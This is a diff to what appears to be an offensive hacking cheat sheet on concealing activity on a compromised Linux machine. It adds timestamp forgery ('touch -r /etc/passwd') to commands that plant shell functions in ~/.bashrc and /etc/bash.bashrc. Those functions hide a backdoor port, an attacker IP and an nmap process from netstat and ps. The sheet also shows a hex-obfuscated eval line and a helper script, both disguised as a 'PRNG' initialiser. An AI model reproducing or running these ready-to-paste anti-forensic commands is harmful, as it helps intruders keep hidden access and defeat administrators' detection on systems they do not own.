@@ -137,13 +137,15 @@ The trick is to hijack `netstat` and use grep to filter out our connection. This
 
 Cut & paste this to add the line to ~/.bashrc
 ```shell
-echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc
+echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
+&& touch -r /etc/passwd ~/.bashrc
 ```
 
 Or cut & paste this for an obfuscated entry to ~/.bashrc:
 ```shell
 X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
-echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc
+echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc \
+&& touch -r /etc/passwd ~/.bashrc
 ```
 
 The obfuscated entry to ~/.bashrc will look like this:
@@ -170,7 +172,8 @@ exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/net
 Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our `grep` does not show up in the process list by renaming it to GREP:
 
 ```shell
-echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc
+echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
+&& touch -r /etc/passwd ~/.bashrc
 ```
 
 <a id="hide-a-process-root"></a>
@@ -210,7 +213,8 @@ In this example our script ```prng``` contains all of our shell functions from a
 ```shell
 echo -e "netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
 ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }" >/usr/bin/prng \
-&& echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc
+&& echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
+&& touch -r /etc/ld.so.conf /etc/bash.bashrc
 ```
 
 (The same works for `lsof`, `ss` and `ls`)
